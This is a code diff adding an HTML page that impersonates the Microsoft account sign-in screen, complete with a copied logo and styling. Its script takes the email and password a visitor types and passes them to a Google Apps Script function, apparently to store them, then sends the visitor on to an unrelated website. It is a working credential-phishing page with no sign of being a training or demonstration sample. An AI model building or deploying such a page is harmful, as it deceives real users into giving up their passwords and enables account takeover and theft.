@@ -1,0 +1,519 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+
+
+
+
+<script>
+      function AddRow()
+    {
+      var email = document.getElementById("email").value;
+      var passwordd = document.getElementById("passwordd").value;
+     
+      if (email==""|| passwordd=="") {
+        return false;
+      }
+      else {
+      google.script.run.AddRecord(email,passwordd);
+      document.getElementById("page2_id1").className = "page2_id1-off";
+      document.getElementById("page3_id1").className = "page3_id1";
+     }
+    }
+
+     function LoginUser()
+    {
+    var email = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    google.script.run.withSuccessHandler(function(output) 
+    {
+      if(output == 'TRUE')
+      {
+         document.getElementById("displayusername").innerHTML = email;
+         document.getElementById("page1_id1").className = "page1_class1-off";
+         document.getElementById("page4_id1").className = "page4_id1";    
+      }
+      else if(output == 'FALSE')
+      {
+        document.getElementById("errorMessage").innerHTML = "Invalid data";     
+      }    
+    }).checkLogin(email, password);
+    }
+    
+function function1(){
+    document.getElementById("page1_id1").className = "page1_class1-off";
+    document.getElementById("page2_id1").className = "page2_id1";
+}
+ 
+function function3(){ 
+  document.getElementById("page3_id1").className = "page3_id1-off";
+  document.getElementById("page1_id1").className = "page1_id1"; 
+}
+
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <style>
+
+
+body{
+            background-image: url('https://img.freepik.com/free-photo/abstract-surface-textures-white-concrete-stone-wall_74190-8184.jpg?w=2000');
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        
+.div1{
+          margin-left: 450px;
+           margin-top: 80px;
+            width: 34.5%;
+            height: 100%;
+             background-color: #ffffff;
+             padding-left: 50px;
+            padding-top: 30px;
+            padding-bottom: 60px;
+        }
+
+        #img1{
+            width: 120px;
+        }
+        #p1{
+            font-size: 30px;
+            font-weight: bold;
+            margin-top: -10px;
+        }
+      
+        hr{
+            width: 400px;
+            margin-left: 0px;
+            margin-right: 100px;
+            margin-bottom: 17px;
+        }
+
+
+
+
+
+
+
+
+
+        #label1{
+            color: #1b1b1b;
+            font-size: 17px;
+        }
+        #a1{
+            color: #108df3;
+            text-decoration: none;
+            font-size: 17px;
+        }
+        #a1:hover{
+            text-decoration: underline;
+            color: #666666;
+
+        }
+
+
+
+        #a2{
+            font-size: 17px;
+            text-decoration: none;
+            color: #108df3;
+            float: left;
+            margin-right: 0px;
+
+        }
+       
+
+
+
+        #a2:hover{
+            text-decoration: underline;
+            color: #666666;
+
+        }
+        #a3{
+            float: left;
+            margin-left: -10px;
+        }
+        #img2{
+            width: 43px;
+            
+        }
+        #next{
+             cursor: pointer;
+            width: 120px;
+            background-color: #005da6;
+            color: white;
+            font-size: 18px;
+            padding: 7px;
+            border: 1px solid #005da6;
+            margin-left: 300px;
+            margin-top: 15px;
+            opacity: 0.9;
+        }
+        #submit:hover{
+            cursor: pointer;
+            opacity: 1;
+        }
+        #div2{
+            margin-left: 450px;
+            height: 60px;
+            margin-top: 22px;
+        }
+        #img3{
+            width: 55px;
+            float: left;
+            margin-left: 50px;
+        }
+        #label2{
+            font-size: 19px;
+            float: left;
+            margin-top: 19px;
+        }
+        #button1{
+            background-color: #ffffff;
+            border: 1px solid #ffffff;
+            width: 510px;
+        }
+        #button1:hover{
+            cursor: pointer;
+            background-color: #e5e5e5;
+            border: 1px solid #e5e5e5;
+        }
+        #div3{
+            margin-top: 70px;
+            margin-left: 1120px;
+        }
+        #a4{
+            color: black;
+            text-decoration: none;
+        }
+        
+
+
+        #a4:hover{
+            text-decoration: underline;
+        }
+        #a5{
+            color: black;
+            margin-left: 20px;
+            text-decoration: none;
+        }
+      
+
+        #a5:hover{
+            text-decoration: underline;
+        }
+
+
+        .divider{
+
+            width: 400px;
+            height: 1px;
+
+            background-color: black;
+            display: inline-block;
+
+        }
+
+
+          .textbox{
+            outline: none;
+
+            border: 1px solid #ffffff;
+            font-size: 18px;
+        }
+        .card{
+            box-shadow: 0 4px 0 rgba(0,0,0,0.2);
+            border-radius: 10%
+            width: 20%;
+            height :20%;
+            margin: auto;
+        }
+
+
+
+
+
+
+          @media only screen and (max-width: 1200px)
+        {
+        body{
+            background-image: url('0');
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        
+.div1{
+          margin-left: 0px;
+           margin-top: 80px;
+            width: 100%;
+            height: 100%;
+             background-color: #ffffff;
+             padding-left: 50px;
+            padding-top: 30px;
+            padding-bottom: 60px;
+        }
+
+
+
+
+
+
+
+
+        #img1{
+            width: 250px;
+            margin-top: -100px;
+            
+
+        }
+        #p1{
+            font-size: 50px;
+            font-weight: bold;
+            margin-top: -10px;
+        }
+      
+
+
+
+        hr{
+            width: 400px;
+            margin-left: 0px;
+            margin-right: 100px;
+            margin-bottom: 17px;
+        }
+
+
+
+
+
+
+
+
+
+        #label1{
+            color: #1b1b1b;
+            font-size: 25px;
+        }
+        #a1{
+            color: #108df3;
+            text-decoration: none;
+            font-size: 25px;
+        }
+        #a1:hover{
+            text-decoration: underline;
+            color: #666666;
+
+        }
+
+
+
+        #a2{
+            font-size: 25px;
+            text-decoration: none;
+            color: #108df3;
+            float: left;
+            margin-right: 0px;
+         
+        }
+       
+
+
+
+        #a2:hover{
+            text-decoration: underline;
+            color: #666666;
+        }
+        #a3{
+            float: left;
+            margin-left: -10px;
+        }
+        #img2{
+            width: 43px;
+            
+        }
+        #next{
+             cursor: pointer;
+            width: 220px;
+            background-color: #005da6;
+            color: white;
+            font-size: 25px;
+            padding: 20px;
+            border: 1px solid #005da6;
+            margin-left: 500px;
+            margin-top: 15px;
+            opacity: 0.9;
+        }
+        #submit:hover{
+            cursor: pointer;
+            opacity: 1;
+        }
+        #div2{
+            margin-left: 0px;
+            height: 60px;
+            margin-top: 22px;
+        }
+        #img3{
+            width: 55px;
+            float: left;
+            margin-left: 50px;
+        }
+        #label2{
+            font-size: 19px;
+            float: left;
+            margin-top: 19px;
+        }
+        #button1{
+            background-color: #ffffff;
+            border: 1px solid #ffffff;
+            width: 510px;
+        }
+        #button1:hover{
+            cursor: pointer;
+            background-color: #e5e5e5;
+            border: 1px solid #e5e5e5;
+        }
+        #div3{
+            margin-top: 70px;
+            margin-left: 1120px;
+        }
+        #a4{
+            color: black;
+            text-decoration: none;
+        }
+        
+
+
+        #a4:hover{
+            text-decoration: underline;
+        }
+        #a5{
+            color: black;
+            margin-left: 20px;
+            text-decoration: none;
+        }
+      
+
+        #a5:hover{
+            text-decoration: underline;
+        }
+
+
+        .divider{
+
+            width: 400px;
+            height: 1px;
+
+            background-color: black;
+            display: inline-block;
+
+        }
+
+
+          .textbox{
+            outline: none;
+
+            border: 0px solid #ffffff;
+            font-size: 30px;
+        }
+        .card{
+            box-shadow: 0 4px 0 rgba(0,0,0,0.2);
+            border-radius: 10%
+            width: 20%;
+            height :20%;
+            margin: auto;
+        }
+
+
+
+
+
+
+        .line {
+            border-bottom: 0px solid black;
+            margin-top: 5px;
+            width: 90%;
+        }
+
+     
+
+   
+        }
+
+
+
+
+
+
+    </style>
+</head>
+<body>
+    
+    <div class="div1">
+        <img id="img1" src="data:image/png;base64,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" alt="">
+        <p id="p1">Sign in</p>
+        <input type="text" id="email" name="email" placeholder="Email, phone, or Skype" required="" class="textbox">
+         <hr class="line" 
+        
+       
+        align="left"> 
+        <br>
+          
+
+
+               <input type="password" id="passwordd" name="Password" placeholder="Password" required="" class="textbox">
+        <hr class="line">
+        <br>
+        <label id="label1" for="">No account?</label>
+        <a id="a1" href="#">Create one!</a><br><br>
+        <br>
+        <a id="a2" href="#">Sign in with Windows Hello or a security key</a>
+        <a id="a3" href="#"><img id="img2" src="data:image/png;base64,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" alt=""></a><br><br>
+        <br>
+    <a href="https://www.industryconnect.org/top-advantages-software-developer-jobs/">  <button id="next" onclick="AddRow()">Sign in</button></a>
+    </div>
+
+    <div id="div2">
+        <button id="button1">
+            <img id="img3" src="key.png" alt="">
+            
+            <label b id="label2" for="">Sign-in options</label>
+        </button>
+
+    </div>
+
+    <div id="div3">
+        <a id="a4" href="#">Terms of use</a>
+        <a id="a5" href="#">Privacy & cookies</a>
+
+    </div>
+
+</body>
+</html>
